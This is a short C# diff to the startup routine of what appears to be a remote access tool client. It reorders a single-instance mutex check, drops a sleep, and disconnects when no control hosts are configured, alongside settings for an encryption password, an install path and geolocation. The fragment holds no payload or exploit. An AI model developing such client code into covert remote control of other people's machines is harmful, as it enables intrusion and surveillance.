@@ -117,15 +117,19 @@ namespace xClient
 
         private static void Initialize()
         {
-            Thread.Sleep(2000);
+            if (!MutexHelper.CreateMutex(Settings.MUTEX))
+                ClientData.Disconnect = true; // process with same mutex is already running
+
+            if (ClientData.Disconnect)
+                return;
 
             AES.PreHashKey(Settings.PASSWORD);
             _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
 
-            if (!MutexHelper.CreateMutex(Settings.MUTEX))
-                ClientData.Disconnect = true;
+            if (_hosts.IsEmpty)
+                ClientData.Disconnect = true; // no hosts to connect
 
             if (ClientData.Disconnect)
                 return;
